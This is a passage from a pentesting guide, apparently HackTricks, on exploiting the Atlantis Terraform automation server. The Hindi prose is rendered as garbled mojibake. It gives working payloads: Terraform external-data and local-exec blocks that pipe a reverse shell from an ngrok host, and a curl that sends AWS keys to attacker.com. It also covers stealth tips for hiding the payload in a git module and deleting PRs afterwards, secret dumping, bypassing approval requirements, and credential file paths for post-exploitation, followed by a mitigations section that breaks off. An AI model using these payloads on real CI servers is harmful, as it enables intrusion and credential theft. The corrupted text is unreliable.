#### Atlantis рдпреЛрдЬрдирд╛ RCE - рдирдП PR рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рдВрд╢реЛрдзрди

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕ рдкрд░ рдПрдХ рдирдИ рд╢рд╛рдЦрд╛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ PR рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдк **`atlantis plan`** **рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╛ рд╢рд╛рдпрдж рдпрд╣ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ)**, **рддреЛ рдЖрдк Atlantis рд╕рд░реНрд╡рд░ рдХреЗ рдЕрдВрджрд░ RCE рдХрд░ рд╕рдХреЗрдВрдЧреЗ**ред

рдЖрдк рдРрд╕рд╛ [**Atlantis рдХреЛ рдПрдХ рдмрд╛рд╣рд░реА рдбреЗрдЯрд╛ рд╕реНрд░реЛрдд рд▓реЛрдб рдХрд░рдиреЗ**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source) рдХреЗ рджреНрд╡рд╛рд░рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдмрд╕ `main.tf` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреА рддрд░рд╣ рдПрдХ рдкреЗрд▓реЛрдб рдбрд╛рд▓реЗрдВ:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**рд╕реНрдЯреЗрд▓реНрдерд┐рдпрд░ рдЕрдЯреИрдХ**

рдЖрдк рдЗрд╕ рдЕрдЯреИрдХ рдХреЛ рдПрдХ **рд╕реНрдЯреЗрд▓реНрдерд┐рдпрд░ рддрд░реАрдХреЗ** рд╕реЗ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрди рд╕реБрдЭрд╛рд╡реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ:

* рдЯреЗрд░рд╛рдлреЙрд░реНрдо рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕реАрдзреЗ рд░реЗрд╡ рд╢реЗрд▓ рдЬреЛрдбрд╝рдиреЗ рдХреЗ рдмрдЬрд╛рдп, рдЖрдк **рдПрдХ рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рд░реЗрд╡ рд╢реЗрд▓ рд╣реЛ:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
рдЖрдк рд░рд┐рд╡ рд╢реЗрд▓ рдХреЛрдб [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules) рдкрд░ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

* рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрди рдореЗрдВ, **ref** рдлрд╝реАрдЪрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ **repo рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╢рд╛рдЦрд╛ рдореЗрдВ terraform rev shell рдХреЛрдб рдХреЛ рдЫрд┐рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ**, рдХреБрдЫ рдЗрд╕ рддрд░рд╣: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **PR рдХреЛ рдорд╛рд╕реНрдЯрд░** рдореЗрдВ рдмрдирд╛рдиреЗ рдХреЗ рдмрдЬрд╛рдп Atlantis рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **2 рд╢рд╛рдЦрд╛рдПрдБ** (test1 рдФрд░ test2) рдмрдирд╛рдПрдВ рдФрд░ рдПрдХ рд╕реЗ рджреВрд╕рд░реА рдХреЗ рд▓рд┐рдП **PR рдмрдирд╛рдПрдВ**ред рдЬрдм рдЖрдк рд╣рдорд▓реЗ рдХреЛ рдкреВрд░рд╛ рдХрд░ рд▓реЗрдВ, рддреЛ рдмрд╕ **PR рдФрд░ рд╢рд╛рдЦрд╛рдУрдВ рдХреЛ рд╣рдЯрд╛ рджреЗрдВ**ред

#### Atlantis рдпреЛрдЬрдирд╛ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдбрдВрдк

рдЖрдк **atlantis plan** (`terraform plan`) рдЪрд▓рд╛рдХрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ terraform рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдбрд╛рд▓рдХрд░:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
#### Atlantis apply RCE - Config modification in new PR

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕ рдкрд░ рдПрдХ рдирдИ рд╢рд╛рдЦрд╛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ PR рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдк **`atlantis apply` рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк Atlantis рд╕рд░реНрд╡рд░ рдХреЗ рдЕрдВрджрд░ RCE рдХрд░ рд╕рдХреЗрдВрдЧреЗ**ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдкрдХреЛ рдЖрдорддреМрд░ рдкрд░ рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА:

* **Mergeable**: рдпрджрд┐ рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ Atlantis рдореЗрдВ рд╕реЗрдЯ рд╣реИ, рддреЛ рдЖрдк рдХреЗрд╡рд▓ **`atlantis apply` рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдпрджрд┐ PR рдорд░реНрдЬ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рд╣реИ** (рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╢рд╛рдЦрд╛ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛)ред
* рд╕рдВрднрд╛рд╡рд┐рдд [**рд╢рд╛рдЦрд╛ рд╕реБрд░рдХреНрд╖рд╛ рдмрд╛рдпрдкрд╛рд╕**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
* **Approved**: рдпрджрд┐ рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ Atlantis рдореЗрдВ рд╕реЗрдЯ рд╣реИ, рддреЛ рдХреБрдЫ **рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ PR рдХреЛ рд╕реНрд╡реАрдХреГрдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛** рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐ рдЖрдк `atlantis apply` рдЪрд▓рд╛ рд╕рдХреЗрдВ
* рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдЖрдк [**Gitbot рдЯреЛрдХрди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг Terraform рдлрд╝рд╛рдЗрд▓ рдкрд░ **`terraform apply` рдЪрд▓рд╛рдирд╛** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**ред**\
рдЖрдкрдХреЛ рдмрд╕ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдХрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреИрд╕реЗ рдХреБрдЫ рдкреЗрд▓реЛрдб `main.tf` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рдПрдВ:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
**рдкрд┐рдЫрд▓реА рддрдХрдиреАрдХ рд╕реЗ рд╕реБрдЭрд╛рд╡реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ** рддрд╛рдХрд┐ рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ **рдЫрд┐рдкреЗ рд╣реБрдП рддрд░реАрдХреЗ** рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

#### Terraform Param Injection

рдЬрдм `atlantis plan` рдпрд╛ `atlantis apply` рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ terraform рдиреАрдЪреЗ рдЪрд▓ рд░рд╣рд╛ рд╣реЛрддрд╛ рд╣реИ, рдЖрдк atlantis рд╕реЗ terraform рдХреЛ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдХрдорд╛рдВрдб рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
рдХреБрдЫ рдЪреАрдЬреЗрдВ рдЬреЛ рдЖрдк рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡реЗ env variables рд╣реИрдВ рдЬреЛ рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдореЗрдВ рд╕рд╣рд╛рдпрдХ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред terraform env vars рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

#### рдХрд╕реНрдЯрдо рд╡рд░реНрдХрдлрд╝реНрд▓реЛ

**рджреБрд╖реНрдЯ рдХрд╕реНрдЯрдо рдмрд┐рд▓реНрдб рдХрдорд╛рдВрдб** рдЪрд▓рд╛рдирд╛ рдЬреЛ `atlantis.yaml` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣реИрдВред Atlantis `atlantis.yaml` рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреБрд▓ рдЕрдиреБрд░реЛрдз рд╢рд╛рдЦрд╛ рд╕реЗ рдХрд░рддрд╛ рд╣реИ, **рдирд╣реАрдВ** `master` рд╕реЗред\
рдпрд╣ рд╕рдВрднрд╛рд╡рдирд╛ рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦрд┐рдд рдХреА рдЧрдИ рдереА:

{% hint style="danger" %}
рдпрджрд┐ [**рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдХреЙрдиреНрдлрд╝рд┐рдЧ**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) рдзреНрд╡рдЬ `allow_custom_workflows` рдХреЛ **True** рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рд░реЗрдкреЛ рдХреА **`atlantis.yaml`** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рдирд┐рд░реНрджрд┐рд╖реНрдЯ** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рднреА рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдХрд┐ **`allowed_overrides`** **`workflow`** рдХреЛ рднреА **рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рд╣реИред

рдпрд╣ рдореВрд▓ рд░реВрдк рд╕реЗ **Atlantis рд╕рд░реНрд╡рд░ рдореЗрдВ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ RCE рджреЗрдЧрд╛ рдЬреЛ рдЙрд╕ рд░реЗрдкреЛ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИ**ред
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### рдпреЛрдЬрдирд╛/рд▓рд╛рдЧреВ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░реЗрдВ

рдпрджрд┐ [**рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдХреЙрдиреНрдлрд╝рд┐рдЧ**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) рдзреНрд╡рдЬ `allowed_overrides` _рдореЗрдВ_ `apply_requirements` рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдПрдХ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА **рдпреЛрдЬрдирд╛/рд▓рд╛рдЧреВ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреА рд╣реИ**ред
```yaml
repos:
- id: /.*/
apply_requirements: []
```
#### PR Hijacking

рдпрджрд┐ рдХреЛрдИ рдЖрдкрдХреЗ рдорд╛рдиреНрдп рдкреБрд▓ рдЕрдиреБрд░реЛрдзреЛрдВ рдкрд░ **`atlantis plan/apply`** рдЯрд┐рдкреНрдкрдгрд┐рдпрд╛рдБ рднреЗрдЬрддрд╛ рд╣реИ, рддреЛ рдпрд╣ terraform рдХреЛ рдЪрд▓рд╛рдиреЗ рдХрд╛ рдХрд╛рд░рдг рдмрдиреЗрдЧрд╛ рдЬрдм рдЖрдк рдирд╣реАрдВ рдЪрд╛рд╣рддреЗред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдЖрдкрдиреЗ **branch protection** рдореЗрдВ рдпрд╣ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рдХрд┐рдпрд╛ рд╣реИ рдХрд┐ рдЬрдм рдПрдХ **рдирдпрд╛ рдХрдорд┐рдЯ** рдЗрд╕рдореЗрдВ **рдкреБрд╢** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рд╣рд░ PR рдХреЛ **рдлрд┐рд░ рд╕реЗ рдореВрд▓реНрдпрд╛рдВрдХрди** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛ рдЬрд╛рдП, рддреЛ рдХреЛрдИ **рджреБрд╖реНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧреНрд╕** (рдкрд┐рдЫрд▓реЗ рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ) terraform рдХреЙрдиреНрдлрд╝рд┐рдЧ рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддрд╛ рд╣реИ, `atlantis plan/apply` рдЪрд▓рд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ Github branch protections рдореЗрдВ **рд╕реЗрдЯрд┐рдВрдЧ** рд╣реИ:

![](<../.gitbook/assets/image (216).png>)

#### Webhook Secret

рдпрджрд┐ рдЖрдк **webhook secret** рдЪреБрд░рд╛рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ рдпрд╛ рдпрджрд┐ рдХреЛрдИ **webhook secret** рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк **Atlantis webhook** рдХреЛ **call** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **atlantis commands** рд╕реАрдзреЗ **invoke** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

#### Bitbucket

Bitbucket Cloud **webhook secrets** рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддрд╛ред рдпрд╣ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ **Bitbucket рд╕реЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреА рдирдХрд▓** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИред рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдк рдХреЗрд╡рд▓ Bitbucket IPs рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд░рд╣реЗ рд╣реИрдВред

* рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░** **Atlantis** рдХреЗ рд▓рд┐рдП **рдлрд░реНрдЬреА рдЕрдиреБрд░реЛрдз** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдРрд╕рд╛ рджрд┐рдЦрддрд╛ рд╣реИ рдЬреИрд╕реЗ рд╡реЗ Bitbucket рд╕реЗ рдЖ рд░рд╣реЗ рд╣реИрдВред
* рдпрджрд┐ рдЖрдк `--repo-allowlist` рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддреЛ рд╡реЗ рдХреЗрд╡рд▓ рдЙрди рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдлрд░реНрдЬреА рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рд╡реЗ рдЬреЛ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдиреБрдХрд╕рд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд╣ рдЖрдкрдХреЗ рдЕрдкрдиреЗ рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдкрд░ plan/apply рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред
* рдЗрд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП, [Bitbucket рдХреЗ IP рдкрддреЗ](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) рдХреЛ allowlist рдХрд░реЗрдВ (Outbound IPv4 addresses рджреЗрдЦреЗрдВ)ред

### Post-Exploitation

рдпрджрд┐ рдЖрдк рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛ рдЧрдП рд╣реИрдВ рдпрд╛ рдХрдо рд╕реЗ рдХрдо рдЖрдкрдХреЗ рдкрд╛рд╕ LFI рд╣реИ, рддреЛ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдЪреАрдЬреЗрдВ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдкрдХреЛ рдкрдврд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП:

* `/home/atlantis/.git-credentials` VCS рдПрдХреНрд╕реЗрд╕ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ
* `/atlantis-data/atlantis.db` рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде VCS рдПрдХреНрд╕реЗрд╕ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform stated file
* рдЙрджрд╛рд╣рд░рдг: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Env рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕
* `/proc/[2-20]/cmdline` `atlantis server` рдХреА Cmd line (рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ)

### Mitigations

#### Don't Use On Public Repos <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

рдХреНрдпреЛрдВрдХрд┐ рдХреЛрдИ рднреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдкреБрд▓ рдЕрдиреБрд░реЛрдзреЛрдВ рдкрд░ рдЯрд┐рдкреНрдкрдгреА рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рд╕рднреА рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЗ рд╕рд╛рде рднреА, рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдкрд░ рдЙрдЪрд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЗ рдмрд┐рдирд╛ Atlantis рдЪрд▓рд╛рдирд╛ рдЕрднреА рднреА рдЦрддрд░рдирд╛рдХ рд╣реИред

#### Don't Use `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

рдпрджрд┐ рдЖрдк рдПрдХ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдкрд░ рдЪрд▓ рд░рд╣реЗ рд╣реИрдВ (рдЬреЛ рдЕрдиреБрд╢рдВрд╕рд┐рдд рдирд╣реАрдВ рд╣реИ, рдКрдкрд░ рджреЗрдЦреЗрдВ) рддреЛ рдЖрдкрдХреЛ `--allow-fork-prs` рд╕реЗрдЯ рдирд╣реАрдВ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ false) рдХреНрдпреЛрдВрдХрд┐ рдХреЛрдИ рднреА рдЕрдкрдиреЗ рдлреЛрд░реНрдХ рд╕реЗ рдЖрдкрдХреЗ рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдХреЗ рд▓рд┐рдП рдПрдХ рдкреБрд▓ рдЕрдиреБрд░реЛрдз рдЦреЛрд▓ рд╕рдХрддрд╛ рд╣реИред

#### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis рдХреЛ рдЖрдкрдХреЛ `--repo-allowlist` рдзреНрд╡рдЬ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡реЗрдмрд╣реБрдХ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдХреА рдПрдХ allowlist рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

* рд╡рд┐рд╢рд┐рд╖реНрдЯ рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* рдЖрдкрдХрд╛ рдкреВрд░рд╛ рд╕рдВрдЧрдарди: `--repo-allowlist=github.com/runatlantis/*`
* рдЖрдкрдХреЗ GitHub Enterprise рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди рдореЗрдВ рд╣рд░ рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА: `--repo-allowlist=github.yourcompany.com/*`
* рд╕рднреА рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА: `--repo-allowlist=*`ред рдЬрдм рдЖрдк рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВ рддреЛ рдпрд╣ рдЙрдкрдпреЛрдЧреА рд╣реИ рд▓реЗрдХрд┐рди рдмрд┐рдирд╛ webhook secret рд╕реЗрдЯ рдХрд┐рдП рдЦрддрд░рдирд╛рдХ рд╣реИред

рдпрд╣ рдзреНрд╡рдЬ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЖрдкрдХреА Atlantis рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди рдЙрди рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд╣реАрдВ рдХрд░рддреЗред рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП `atlantis server --help` рджреЗрдЦреЗрдВред

#### Protect Terraform Planning <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рджреБрд╖реНрдЯ Terraform рдХреЛрдб рдХреЗ рд╕рд╛рде рдкреБрд▓ рдЕрдиреБрд░реЛрдз рдкреНрд░рд╕реНрддреБрдд рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддреЛ рдпрд╣ рдЖрдкрдХреЗ рдЦрддрд░реЗ рдХреЗ рдореЙрдбрд▓ рдореЗрдВ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ `terraform apply` рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реИрдВред рдпрд╣ [`external` data source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╛ рдПрдХ рджреБрд╖реНрдЯ 